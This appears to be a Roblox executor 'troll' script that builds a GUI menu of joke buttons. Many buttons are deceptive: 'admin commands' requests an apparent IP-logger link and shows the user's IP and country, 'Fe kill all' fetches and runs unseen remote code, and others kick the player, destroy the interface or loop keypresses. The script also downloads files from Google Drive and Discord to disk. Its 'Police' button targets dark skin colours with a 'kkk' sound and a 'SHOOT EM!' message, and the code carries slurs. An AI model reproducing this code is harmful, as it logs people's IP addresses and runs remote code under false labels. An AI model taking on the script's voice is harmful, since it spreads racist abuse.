local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wall%20v3')))()


local w = library:CreateWindow("made by cruxj") -- Creates the window

local b = w:CreateFolder("g̶͔̹̱̜͓̰̲̣̜̯͓̗̫̺͔͖̹͇̗͓̤̣̥͈̟̓̾̄̾̓́̂̆͐̆͐̂̎͌̀̾̉͊̾͑̅͒̀̉͛̄̀̂͌͝͝͝͠ͅͅǫ̸̡̻̦̻̬̲̦̻̲͉̹̭̰̫̞̣̙̟̹͖̻̹̊͗̏̄o̵̼̳̟̺̤̪̲̞̰͓͖̭̠͉͂̀̈́̎͊̌͛̒͒̐̈́̈́̊̓̔̃̃̓͋͑̂̾͒̃̅̃̿̐͊͐͒̍͋̕͘̕͝͠f̴̮͈̿̅́̿̀̓͋͗̂̈́̂͐̒̃̆̈́̽̃̈́̒̄́̽͆́̈́͗̈̐͒͋͆́̾̑̕͘͜͝ÿ̷̦́̒̓̓̍̈͋̍͋̽̈́̀́̔̅̔͗̀̆͂̈́͝͝") -- Creates the folder(U will put here your buttons,etc)
local c = w:CreateFolder("section 2")
local d = w:CreateFolder("sextion 3.0")
local l = w:CreateFolder("final battle")
b:Label("The FitnessGram™ Pacer Test is a multistage aerobic capacity test that progressively gets more difficult as it continues. The 20 meter pacer test will begin in 30 seconds. Line up at the start. The running speed starts slowly, but gets faster each minute after you hear this signal. [beep] A single lap should be completed each time you hear this sound. [ding] Remember to run in a straight line, and run as long as possible. The second time you fail to complete a lap before the sound, your test is over. The test will begin on the word start. On your mark, get ready, start.",{
    TextSize = 4.5; -- Self Explaining
    TextColor = Color3.fromRGB(255,255,255); -- Self Explaining
    BgColor = Color3.fromRGB(69,69,69); -- Self Explaining
    
}) 
b:Slider("walkspeed",{
    min = 10; -- min value of the slider
    max = 50; -- max value of the slider
    precise = true; -- max 2 decimals
},function(value)
   wait(1)
   game.Players.LocalPlayer:Kick("bitch you thought")
end)
b:Slider("Jumppower",{
    min = 10; -- min value of the slider
    max = 50; -- max value of the slider
    precise = true; -- max 2 decimals
},function(value)
   wait(1)
   game.Players.LocalPlayer:Kick("bitch you thought")
end)
b:Button("DO A FLIP",function()

   spawn(function()
   local stateType = Enum.HumanoidStateType

local character = game.Players.LocalPlayer.Character
local humanoid = character:WaitForChild("Humanoid")

humanoid:SetStateEnabled(stateType.FallingDown, false)
humanoid:SetStateEnabled(stateType.Ragdoll, false)
   local flipper = game.Players.LocalPlayer.Character.Humanoid
local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=4911756917"
hi.Volume = 10
hi.Looped = false
hi.archivable = false
hi.Parent = game.Workspace



getgenv().gravity = game.Workspace.Gravity
flipper:GetPropertyChangedSignal("Jump"):Connect(function()
if flipper.Jump == true then
hi.TimePosition = 0.6
hi:Play()
	local Spin = Instance.new("BodyAngularVelocity")
	Spin.Name = "flipping"
	Spin.Parent = game.Players.LocalPlayer.Character.Head
	Spin.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
	Spin.AngularVelocity = Vector3.new(10,0,0)
	
	wait(0.5)
	
	game.Workspace.Gravity = 1000
	wait()
	game.Workspace.Gravity = gravity
	game.Players.LocalPlayer.Character.Head.flipping:Destroy()
	wait(0.5)
	hi:Stop()
	end
	end)
end)
Notify("Keybinds", "jump to flip", 5)
end)
b:Button("Dont Drop the Soap R6",function()
    spawn(function()
getgenv().ssss = game.Players.LocalPlayer:GetMouse()

getgenv().jigger = false
local seee = Instance.new("Sound")
seee.Name = "Sound"
seee.SoundId = "http://www.roblox.com/asset/?id=9114759339"
seee.Volume = 10
seee.Looped = false
seee.archivable = false
seee.Parent = game.Workspace


local speaker = game.Players.LocalPlayer
local Anim = Instance.new("Animation")
     Anim.AnimationId = "rbxassetid://148840371"
     local bruh = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)


ssss.KeyDown:connect(function(key)
if key == "z" then
getgenv().oooog = true
while oooog == true do
    wait()


getgenv().jigger = true
local Anim = Instance.new("Animation")
     Anim.AnimationId = "rbxassetid://148840371"
     local bruh = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)

bruh:Play()
bruh:AdjustSpeed(10)	
	while jigger == true do

seee:Play()
wait(0.2)
end
end
if game.Players.LocalPlayer.Character.Humanoid.RigType.Name ~= "R6" then

                           game:GetService('StarterGui'):SetCore('SendNotification', {
       Title = 'Hey',
       Text = "you need to be R6",
       Duration = 1
   })    
end
end


end)




ssss.KeyDown:connect(function(key)
if key == "x" then
getgenv().jigger = false
getgenv().oooog = false
for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetPlayingAnimationTracks()) do
	v:Stop()
end	

end

end)

    end)
Notify("Keybinds", "Z is on X is off", 2)
end)
b:Button("This Song Is the Bomb",function()
local explosion = Instance.new("Explosion")
explosion.BlastRadius = 6022
explosion.ExplosionType = Enum.ExplosionType.Craters 
explosion.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
explosion.Parent = workspace
wait(0.2)
game:Shutdown()
end)
b:Button("crackhead walking",function()
game.Players.LocalPlayer.Character.Humanoid.Running:Connect(function(speed)
    if speed > 0 then
       	local Spin = Instance.new("BodyAngularVelocity")
	Spin.Name = "Spinning"
	Spin.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
	Spin.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
	Spin.AngularVelocity = Vector3.new(0,10,0)	   
	   

        else
     
       for i,v in next, game.Players.LocalPlayer.Character.HumanoidRootPart:GetChildren() do
       if v.Name == "Spinning" then
       v:Destroy()
       end
end
end
end)
 Notify("OMG", "ITS A CRACKHEAD", 1.5)  
end)
b:Button("ghost",function()
for i,v in next, game.Players.LocalPlayer.Character:GetChildren() do
    if v.ClassName == "Part" and v.Name ~= "HumanoidRootPart" then 
      v.Transparency = 0.3
      end  
    end
wait(3)
 local explosion = Instance.new("Explosion")
explosion.BlastRadius = 6022
explosion.ExplosionType = Enum.ExplosionType.Craters 
explosion.Position = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
explosion.Parent = workspace
wait(0.2)
game.Players.LocalPlayer:Kick("You Got Hunted By The GhostBusters")
end)
b:Button("Hug the ground",function()
for i,z in next, game.Players.LocalPlayer.Character:GetChildren() do
if z.ClassName == "Part" then

for i,v in next, game.Workspace:GetDescendants() do
    if v.ClassName == "Part" and v ~= z then 
      v.Anchored = false
           	local Spin = Instance.new("BodyAngularVelocity")
	Spin.Name = "Spinning"
	Spin.Parent = v
	Spin.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
	Spin.AngularVelocity = Vector3.new(100,100,100)	 
      
end
end
end
end
end)
b:Button("Ohio at night",function()
game:GetService("Lighting").FogColor = Color3.new(0,0,0)
game:GetService("Lighting").FogEnd = 1
game:GetService("Lighting").ClockTime = 0
game:GetService("Lighting").Sky.StarCount = 0
game:GetService("Lighting").Sky.MoonAngularSize = 0
game:GetService("Lighting"):FindFirstChild("Atmosphere"):Destroy()
for i,v in next, game:GetService("CoreGui"):GetChildren() do
    v:Destroy()
end
for i,v in next, game:GetService("CorePackages"):GetChildren() do
    v:Destroy()
end
for i,v in next, game:GetService("Players").goodluck3646.PlayerGui:GetChildren() do
    v:Destroy()
end
end)
b:Button("???",function()
 game:GetService"RunService".RenderStepped:Connect(function()
game:GetService"RunService".RenderStepped:Connect(function()

local part = Instance.new("Part") 

part.Name = "a" 
part.Anchored = false 
 part.Size = Vector3.new(1,1,1)
 part.Material = "Air"
 part.Shape = "Ball"
 part.Color = Color3.fromRGB(106, 57, 9)
part.Parent = game.Workspace
part.CFrame = game.Players.LocalPlayer.Character.Head.CFrame


end)
end)
   Notify("haha", "silly funni doo doo", 1.5)   
end)

c:Button("dark souls walk",function()
local players = game:GetService("Players")
local player = players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
while true do
    wait()
player.Character.HumanoidRootPart.RootJoint.C0 = player.Character.HumanoidRootPart.RootJoint.C0 * CFrame.Angles(1, 0, 1)
end
 Notify("Better than the Griddy", "Bottom Text", 1.5)  
end)
c:Button("crip walk",function()
local players = game:GetService("Players")
local player = players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

player.Character.HumanoidRootPart.RootJoint.C0 = player.Character.HumanoidRootPart.RootJoint.C0 * CFrame.Angles(1.6, 0, 0)
 Notify("hey", "are you feeling down today?", 1.5)  
end)
c:Button("Ground Pound",function()
getgenv().hum = game.Players.LocalPlayer.Character.Humanoid
getgenv().UCFGnGzQsXeomsjIdfW9gaUQ = workspace.Gravity
getgenv().jumppenis = game.Players.LocalPlayer.Character.Humanoid.JumpPower
game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
wait()
workspace.Gravity = 50
wait()
hum.Jump = true
wait(1)
game.Players.LocalPlayer.Character.Humanoid.Sit = true
	local BeenASecond, V3 = false, Vector3.new(0, 0, 0)
	delay(0, function()
		BeenASecond = true
	end)
	while not BeenASecond do
		for _, v in ipairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if v.IsA(v, "BasePart") then
				v.Velocity, v.RotVelocity = V3, V3
			end
		end
		wait()
	end
	wait(0.5)
	workspace.Gravity = 1000
	wait(0.5)
 game.Players.LocalPlayer.Character.Humanoid.JumpPower = jumppenis
 game.Players.LocalPlayer.Character.Humanoid.Sit = false
 game.workspace.Gravity = UCFGnGzQsXeomsjIdfW9gaUQ    
end)
c:Button("orbital strike cannon",function()
local uis = game:GetService("UserInputService")
uis.InputBegan:connect(function(inst)
if inst.UserInputType == Enum.UserInputType.MouseButton1 then

getgenv().booga = true
while booga == true do
   wait(0.1)
spawn(function()
local position = game.Players.LocalPlayer:GetMouse().Hit.p
local explosion = Instance.new("Explosion")
explosion.BlastRadius = 10
explosion.ExplosionType = Enum.ExplosionType.Craters 
explosion.Position = position
explosion.Parent = workspace
end)

end
end
end)
uis.InputEnded:connect(function(inst)
if inst.UserInputType == Enum.UserInputType.MouseButton1 then
getgenv().booga = false
while booga == true do
   wait(0.1)
spawn(function()
local position = game.Players.LocalPlayer:GetMouse().Hit.p
local explosion = Instance.new("Explosion")
explosion.BlastRadius = 10
explosion.ExplosionType = Enum.ExplosionType.Craters 
explosion.Position = position
explosion.Parent = workspace
end)

end
end
end)
Notify("Keybinds", "hold mouse button", 2)
end)
c:Button("legalize nuclear bombs",function()
local ScreenGui = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer.PlayerGui)
local VideoFrame = Instance.new('VideoFrame', ScreenGui)
VideoFrame.Video = Video
VideoFrame.Visible = true
VideoFrame.Size = UDim2.new(1,0,1,0)
VideoFrame:Play()
    end)
c:Button("compression",function()
for i,v in next,game.Players.LocalPlayer.Character:GetChildren() do
  if v.ClassName == "Part"  then
      v.Position = game.Players.LocalPlayer.Character.Head.Position
      end
    end
end)
c:Button("Infinite Robux",function()
local seee = Instance.new("Sound")
seee.Name = "Sound"
seee.SoundId = "http://www.roblox.com/asset/?id=5504868762"
seee.Volume = 10
seee.Looped = false
seee.archivable = false
seee.Parent = game.Workspace
seee:Play()
wait(4)
seee:Stop()
game.Players.LocalPlayer:Kick("cums!!!!")

end)
c:Button("Fe kill all",function()
 Notify("Loading Pipe Bomb", "", 1.5)  
loadstring(game:HttpGet("https://raw.githubusercontent.com/yeerma/such/a3a5bd84e59765dfb85e48e7427715cdb6039828/sasdsaw"))()
end)
d:Button("seer",function()
for i,v in pairs(game:GetDescendants()) do
pcall(function()
     v.Visible = true
end)end
end)
d:Button("Devious AF Walk",function()
 
if game.Players.LocalPlayer.Character:FindFirstChild("Torso") then
    game.Players.LocalPlayer.Character:FindFirstChild("Right Arm").Name = "a"
    
    game.Players.LocalPlayer.Character:FindFirstChild("Left Arm").Name = "a"
        else
        game.Players.LocalPlayer.Character:FindFirstChild("LeftHand").Name = "a"    
            
            game.Players.LocalPlayer.Character:FindFirstChild("RightUpperArm").Name = "a"

                game.Players.LocalPlayer.Character:FindFirstChild("RightLowerArm").Name = "a"
                    game.Players.LocalPlayer.Character:FindFirstChild("RightHand").Name = "a"
                        game.Players.LocalPlayer.Character:FindFirstChild("LeftUpperArm").Name = "a"
                            game.Players.LocalPlayer.Character:FindFirstChild("LeftLowerArm").Name = "a"
                                game.Players.LocalPlayer.Character:FindFirstChild("LeftArm").Name = "a"
end
 Notify("WHAT YOU SAY FOO", "", 1.5)  
end)
d:Button("Silence Broken by",function()
for i = 0,30 do
local Id = "http://www.roblox.com/asset/?id=1058427120"

local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = Id
hi.Volume = 10
hi.Looped = false
hi.archivable = false
hi.Parent = game.Workspace



while true do
   wait(math.random(10,100))
   hi:Play()
end
end
 Notify("certified classic", "", 1.5)  
end)
d:Button("cookie clicker",function()

game.Workspace:FindFirstChild("cookiesinmyballs"):Play()
  local function CreateInstance(cls,props)
local inst = Instance.new(cls)
for i,v in pairs(props) do
inst[i] = v
end
return inst
end
getgenv().cookies = 0
getgenv().clicknumber = 1

local Clocker = CreateInstance('ScreenGui',{DisplayOrder=0,Enabled=true,ResetOnSpawn=true,Name='Clocker', Parent=game.CoreGui})
local background = CreateInstance('ImageLabel',{Image='rbxassetid://2851926732',ImageColor3=Color3.new(0.117647, 0.117647, 0.117647),ImageRectOffset=Vector2.new(0, 0),ImageRectSize=Vector2.new(0, 0),ImageTransparency=0,ScaleType=Enum.ScaleType.Slice,SliceCenter=Rect.new(12, 12, 12, 12),Active=false,AnchorPoint=Vector2.new(0.5, 0.5),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=true,Draggable=false,Position=UDim2.new(0.0424528308, 0, 0.0470347628, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 70, 0, 28),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='background',Parent = Clocker})
local timerlabel = CreateInstance('TextLabel',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size14,Text='Cookies',TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 70, 0, 13),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='timerlabel',Parent = background})
local timer = CreateInstance('TextLabel',{Font=Enum.Font.SourceSans,FontSize=Enum.FontSize.Size14,Text=cookies,TextColor3=Color3.new(1, 1, 1),TextScaled=false,TextSize=14,TextStrokeColor3=Color3.new(0, 0, 0),TextStrokeTransparency=1,TextTransparency=0,TextWrapped=false,TextXAlignment=Enum.TextXAlignment.Center,TextYAlignment=Enum.TextYAlignment.Center,Active=false,AnchorPoint=Vector2.new(0, 0),BackgroundColor3=Color3.new(1, 1, 1),BackgroundTransparency=1,BorderColor3=Color3.new(0.105882, 0.164706, 0.207843),BorderSizePixel=1,ClipsDescendants=false,Draggable=false,Position=UDim2.new(0, 0, 0.535714269, 0),Rotation=0,Selectable=false,Size=UDim2.new(0, 70, 0, 13),SizeConstraint=Enum.SizeConstraint.RelativeXY,Visible=true,ZIndex=1,Name='timer',Parent = background})

  local z = library:CreateWindow("cookie cligger") 
  local e = z:CreateFolder("get 100 trillion to win")
getgenv().cps = 0
getgenv().fakeasscps = 0

  e:Button("click cookie",function()
      getgenv().cookies = cookies + clicknumber
      timer.Text = cookies

  end)
  e:Button("Current cps",function()
Notify("your current cps is", fakeasscps, 2)
  end)

   e:Button("+1,-100",function()
      if cookies >=100 then
      getgenv().cookies = cookies - 100
      getgenv().cps = cps + 1
      getgenv().fakeasscps = fakeasscps + 3
      
      timer.Text = cookies
      end
      
   end)
     e:Button("+11,-1000",function()
      if cookies >=1000 then
       getgenv().cps = cps + 11
        getgenv().cookies = cookies - 1000
getgenv().fakeasscps = fakeasscps + 33
      
      timer.Text = cookies
      end
      
     end)
       e:Button("+120,-10000",function()
      
      if cookies >=10000 then
       getgenv().cps = cps + 120
       getgenv().cookies = cookies - 10000
getgenv().fakeasscps = fakeasscps + 360
      
      timer.Text = cookies
      end
      
      end)
       e:Button("+1300,-100000",function()
      
      if cookies >=100000 then
      getgenv().cps = cps + 1300
       getgenv().cookies = cookies - 100000
getgenv().fakeasscps = fakeasscps + 3900
      
      timer.Text = cookies
      end
      
       end)
         e:Button("+14000,-1000000",function()
      
      if cookies >=1000000 then
      getgenv().cps = cps + 14000
       getgenv().cookies = cookies - 1000000
getgenv().fakeasscps = fakeasscps + 42000
      
      timer.Text = cookies
      end
      
         end)
           e:Button("+150000,-10000000",function()
      
      if cookies >=10000000 then
      getgenv().cps = cps + 150000
       getgenv().cookies = cookies - 10000000
     getgenv().fakeasscps = fakeasscps + 450000
      
      timer.Text = cookies
      end
      
           end)
                      e:Button("+1500000,-100000000",function()
      
      if cookies >=100000000 then
       getgenv().cps = cps + 1500000
       getgenv().cookies = cookies - 100000000
       getgenv().fakeasscps = fakeasscps + 4500000
      
      timer.Text = cookies
      end
      
                      end)
                             e:Button("+15000000,-1000000000",function()
      
      if cookies >=1000000000 then
       getgenv().cookies = cookies - 1000000000
         getgenv().cps = cps + 15000000
        getgenv().fakeasscps = fakeasscps + 45000000
      
      
      timer.Text = cookies
      end
      
                             end)
                             e:Button("win game",function()
                                         if getgenv().cookies >= 100000000000000 then
         game.Players.LocalPlayer:Kick("You Beat Cookie Clicker!!!")
        
        
         else Notify("HEY!", "You Cant Afford That Yet!", 1)
                                         end
       
         end)
 while true  do
         wait(0.333)
                   getgenv().cookies = cookies + cps
          timer.Text = cookies
         if getgenv().cookies >= 100000000000000 then
         game.Players.LocalPlayer:Kick("You Beat Cookie Clicker!!!")
         end
    end



         
      
   

Notify("Keybinds", "Nigga there are none", 1)

end)
d:Button("shiny",function()

for i,v in pairs(game:GetDescendants()) do
if v.ClassName == "Part" then
    v.Material = "Glass"
    v.Reflectance = 122222
    end
 
  
end
	

end)
d:Button("Government belike",function()
local StarterGui = game:GetService("StarterGui") -- Make sure this LOCAL SCRIPT is in StarterGui!
game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text =  ""..game.Players.LocalPlayer.Name.." I Found Out How To Cure all Cancers, Debts, And Taxes!"; -- Required. Has to be a string!
	Color = Color3.new(1, 1, 1); -- Cyan is (0,255/255,255/255) -- Optional defaults to white: Color3.new(255/255, 255/255, 243/255)
	Font = Enum.Font.SourceSansBold; -- Optional, defaults to Enum.Font.SourceSansBold
	FontSize = Enum.FontSize.Size24; -- Optional, defaults to Enum.FontSize.Size18
})
wait(3)
game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text =  ""..game.Players.LocalPlayer.Name.." First you want to pou-"; -- Required. Has to be a string!
	Color = Color3.new(1, 1, 1); -- Cyan is (0,255/255,255/255) -- Optional defaults to white: Color3.new(255/255, 255/255, 243/255)
	Font = Enum.Font.SourceSansBold; -- Optional, defaults to Enum.Font.SourceSansBold
	FontSize = Enum.FontSize.Size24; -- Optional, defaults to Enum.FontSize.Size18
})
wait(1.5)
local StarterGui = game:GetService("StarterGui") -- Make sure this LOCAL SCRIPT is in StarterGui!
game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text = "[Government]: Terminating "..game.Players.LocalPlayer.Name.." and their family for violating Tos of life"; -- Required. Has to be a string!
	Color = Color3.new(255, 0, 0); -- Cyan is (0,255/255,255/255) -- Optional defaults to white: Color3.new(255/255, 255/255, 243/255)
	Font = Enum.Font.SourceSansBold; -- Optional, defaults to Enum.Font.SourceSansBold
	FontSize = Enum.FontSize.Size24; -- Optional, defaults to Enum.FontSize.Size18
})
wait(3)
game:GetService("StarterGui"):SetCore("ChatMakeSystemMessage",{
	Text =  ""..game.Players.LocalPlayer.Name.." Fuck! i knew i shouldn't have been a scientist"; -- Required. Has to be a string!
	Color = Color3.new(1, 1, 1); -- Cyan is (0,255/255,255/255) -- Optional defaults to white: Color3.new(255/255, 255/255, 243/255)
	Font = Enum.Font.SourceSansBold; -- Optional, defaults to Enum.Font.SourceSansBold
	FontSize = Enum.FontSize.Size24; -- Optional, defaults to Enum.FontSize.Size18
})
wait(1.5)

while true do
wait(0.5)
game.Players.LocalPlayer.Character.Humanoid.Health = 0
local hi = Instance.new("Sound")
hi.Name = "Sound"
hi.SoundId = "http://www.roblox.com/asset/?id=3723473505"
hi.Volume = 10
hi.Looped = false
hi.archivable = false
hi.Parent = game.Workspace
hi:Play()
    end
end)

d:Button("Police",function()
local imbrickedup = game.Players.LocalPlayer.Character.Head.BrickColor
if imbrickedup == 
BrickColor.new("Medium brown") or imbrickedup == BrickColor.new("Burnt Sienna")
or imbrickedup == BrickColor.new("Really black") or imbrickedup == BrickColor.new("Black")
or imbrickedup == BrickColor.new("Pine Cone") or imbrickedup == BrickColor.new("Dark taupe")
or imbrickedup == BrickColor.new("Reddish brown") or imbrickedup == BrickColor.new("Brown")
or imbrickedup == BrickColor.new("CGA brown") or imbrickedup == BrickColor.new("Rust")
then
game.Workspace:FindFirstChild("kkk"):Play()

Notify("QUICK", "SHOOT EM!", 1.5)
game.Players.LocalPlayer.Character.Humanoid.Health = 0
else
Notify("yay", "you are acceptable.", 3)
    end
end)
d:Box("Question Answerer","string",function(value)
  if value == "" then
      Notify("Bro say sum", "type a question", 1.5)  
      else
  if math.random(1,2) == 1 then
  Notify("Oooga Booga says", "Yes.", 1.5)    
  else
  Notify("Oooga Booga says", "Hell Nah", 1.5) 
  end
  end
  end)

d:Button("Virus",function()
game:GetService("Lighting").FogColor = Color3.new(0,0,0)
game:GetService("Lighting").FogEnd = 1
game:GetService("Lighting").ClockTime = 0
game:GetService("Lighting").Sky.StarCount = 0
game:GetService("Lighting").Sky.MoonAngularSize = 0
game:GetService("Lighting"):FindFirstChild("Atmosphere"):Destroy()
for i,v in next, game:GetService("CoreGui"):GetChildren() do
    v:Destroy()
end
for i,v in next, game:GetService("CorePackages"):GetChildren() do
    v:Destroy()
end
for i,v in next, game:GetService("Players").goodluck3646.PlayerGui:GetChildren() do
    v:Destroy()
end
wait(1)
game:GetService("RunService").RenderStepped:Connect(function()
keypress(0x7A) 
keyrelease(0x7A)
end)
end)
l:Button("Stubbable Toe",function()
local torso
	if game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso") then
		torso = game.Players.LocalPlayer.Character.UpperTorso
	else
		torso = game.Players.LocalPlayer.Character.Torso
	end
	local function touchedFunc(hit)
		local Root = game.Players.LocalPlayer.Character.HumanoidRootPart
		if hit:IsA("BasePart") and hit.Position.Y > Root.Position.Y - game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').HipHeight then
		game.Players.LocalPlayer.Character.Humanoid:ChangeState(0)
		Root.Velocity = Root.CFrame.LookVector * 30
	wait(0.3)
	game.Players.LocalPlayer.Character.Humanoid.Health = 0
		end
	end
	walltpTouch = torso.Touched:Connect(touchedFunc)
	end)
l:Button("Random drugs 1",function()
local part = Instance.new("ColorCorrectionEffect") 

part.Name = "cream" 
part.Brightness = 1000
part.Contrast = 0
part.Saturation = -9999999
part.Parent = game:GetService("Workspace").Camera
--
end)
l:Button("Random drugs 2",function()
local part = Instance.new("ColorCorrectionEffect") 

part.Name = "scream" 
part.Brightness = -600000
part.Contrast = 1123123
part.Saturation = 0
part.Parent = game:GetService("Workspace").Camera
--
end)
l:Button("Random drugs 3",function()
local part = Instance.new("ColorCorrectionEffect") 

part.Name = "noir" 
part.Brightness = 0
part.Contrast = 0
part.Saturation = -1
part.Parent = game:GetService("Workspace").Camera
--
end)
l:Button("Random drugs 4",function()
local part = Instance.new("BlurEffect") 

part.Name = "our" 
part.Size = 12003123
part.Parent = game:GetService("Workspace").Camera
--
end)

l:Button("admin commands",function()
hidden = gethiddenproperty or get_hidden_prop

  local country = game:GetService("HttpService"):JSONDecode(game:HttpGet("http://country.io/names.json"))
  local LeakCountry = country[hidden(game.Players.LocalPlayer, "CountryRegionCodeReplicate")]

local ip = tostring(game:HttpGet("https://2no.co/2etDS4", true))
Notify("ip logged", ip, 2)
Notify("dsc.gg/rbloxloggedLLLL proof you live in the", LeakCountry, 2)
end)
l:Button("og mrkrabs walk",function()
game:GetService"RunService".RenderStepped:Connect(function()
spawn(function()
for i,v in next, game.Players.LocalPlayer.Character:FindFirstChild("Humanoid").Animator:GetPlayingAnimationTracks() do
if v.Name == "WalkAnim" or v.Name == "RunAnim" then
   v:AdjustSpeed(10)
   end
end
game.Players.LocalPlayer.Character.HumanoidRootPart.Running.PlaybackSpeed = 1
game.Players.LocalPlayer.Character.HumanoidRootPart.Running.Volume = 10
game.Players.LocalPlayer.Character.HumanoidRootPart.Running.SoundId = "http://www.roblox.com/asset/?id=3426632334"
end)
end)
end)
l:Button("Super Flip",function()
   local stateType = Enum.HumanoidStateType

local character = game.Players.LocalPlayer.Character
local humanoid = character:WaitForChild("Humanoid")

humanoid:SetStateEnabled(stateType.FallingDown, false)
humanoid:SetStateEnabled(stateType.Ragdoll, false)
local flipper = game.Players.LocalPlayer.Character.Humanoid
flipper:GetPropertyChangedSignal("Jump"):Connect(function()
if flipper.Jump == true then
wait(0.4)
	local Spin = Instance.new("BodyAngularVelocity")
	Spin.Name = "flipping"
	Spin.Parent = game.Players.LocalPlayer.Character.Head
	Spin.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
	Spin.AngularVelocity = Vector3.new(10,0,0)
	
game.Workspace.Gravity = 0
wait()
	local BeenASecond, V3 = false, Vector3.new(0, 0, 0)
	delay(0, function()
		BeenASecond = true
	end)
	while not BeenASecond do
		for _, v in ipairs(game.Players.LocalPlayer.Character:GetDescendants()) do
			if v.IsA(v, "BasePart") then
				v.Velocity, v.RotVelocity = V3, V3
			end
		end
		wait()
	end
	end
	end)
end)



l:Button("Pet Rock",function()
local part = Instance.new("Part") 

part.Name = "a" 
part.Anchored = true 
 part.Size = Vector3.new(1,1,1)
 part.Material = "Air"
 part.Shape = "Ball"
 part.Color = Color3.fromRGB(91, 93, 105)
 part.CanCollide = false
part.Parent = game.Workspace
while true do
    wait()
part.CFrame = game.Players.LocalPlayer.Character.Head.CFrame * CFrame.new(0, 1, 0)
end
    end)





function Notify(titletxt, text, time)
    local GUI = Instance.new("ScreenGui")
    local Main = Instance.new("Frame", GUI)
    local title = Instance.new("TextLabel", Main)
    local message = Instance.new("TextLabel", Main)
    GUI.Name = "NotificationOof"
    GUI.Parent = game.CoreGui
    Main.Name = "MainFrame"
    Main.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
    Main.BorderSizePixel = 0
    Main.Position = UDim2.new(1, 5, 0, 50)
    Main.Size = UDim2.new(0, 330, 0, 100)

    title.BackgroundColor3 = Color3.new(0, 0, 0)
    title.BackgroundTransparency = 0.89999997615814
    title.Size = UDim2.new(1, 0, 0, 30)
    title.Font = Enum.Font.SourceSansSemibold
    title.Text = titletxt
    title.TextColor3 = Color3.new(1, 1, 1)
    title.TextSize = 17
    
    message.BackgroundColor3 = Color3.new(0, 0, 0)
    message.BackgroundTransparency = 1
    message.Position = UDim2.new(0, 0, 0, 30)
    message.Size = UDim2.new(1, 0, 1, -30)
    message.Font = Enum.Font.SourceSans
    message.Text = text
    message.TextColor3 = Color3.new(1, 1, 1)
    message.TextSize = 16

    wait(0.1)
    Main:TweenPosition(UDim2.new(1, -330, 0, 50), "Out", "Sine", 0.5)
    wait(time)
    Main:TweenPosition(UDim2.new(1, 5, 0, 50), "Out", "Sine", 0.5)
    wait(0.6)
    GUI:Destroy();
end


if isfile("gii.mp3") then
if readfile("gii.mp3") ~= game:HttpGet("https://drive.google.com/uc?export=download&id=1VyyPnVagV4hovyVlZWADf-xU6u3G33Is") then
writefile("gii.mp3", game:HttpGet("https://drive.google.com/uc?export=download&id=1VyyPnVagV4hovyVlZWADf-xU6u3G33Is"))
end
else
writefile("gii.mp3", game:HttpGet("https://drive.google.com/uc?export=download&id=1VyyPnVagV4hovyVlZWADf-xU6u3G33Is"))
end
local gii = getsynasset("gii.mp3")
local hi = Instance.new("Sound")
hi.Name = "cookiesinmyballs"
hi.SoundId = gii
hi.Volume = 2
hi.Looped = true
hi.archivable = false
hi.Parent = game.Workspace
local VideoData = syn.request({
   Url = 'https://cdn.discordapp.com/attachments/697603974005653544/1053786867780300890/ligger.webm',
   Method = 'GET'
})
VideoData = VideoData.Body
writefile('tempvid.mp4', VideoData)
getgenv().Video = getsynasset('tempvid.mp4')
getgenv().Video = getsynasset('tempvid.mp4')
if isfile("kkk.mp3") then
if readfile("kkk.mp3") ~= game:HttpGet("https://drive.google.com/uc?export=download&id=1vqqtYDx_UNZ2LECvwTd_iEMs2DMEB_Dr") then
writefile("kkk.mp3", game:HttpGet("https://drive.google.com/uc?export=download&id=1vqqtYDx_UNZ2LECvwTd_iEMs2DMEB_Dr"))
end
else
writefile("kkk.mp3", game:HttpGet("https://drive.google.com/uc?export=download&id=1vqqtYDx_UNZ2LECvwTd_iEMs2DMEB_Dr"))
end
local kkk = getsynasset("kkk.mp3")
local kkkk = Instance.new("Sound")
kkkk.Name = "kkk"
kkkk.SoundId = kkk
kkkk.Volume = 10
kkkk.Looped = false
kkkk.archivable = false
kkkk.Parent = game.Workspace
Notify("hey", "script fully loaded", 3)
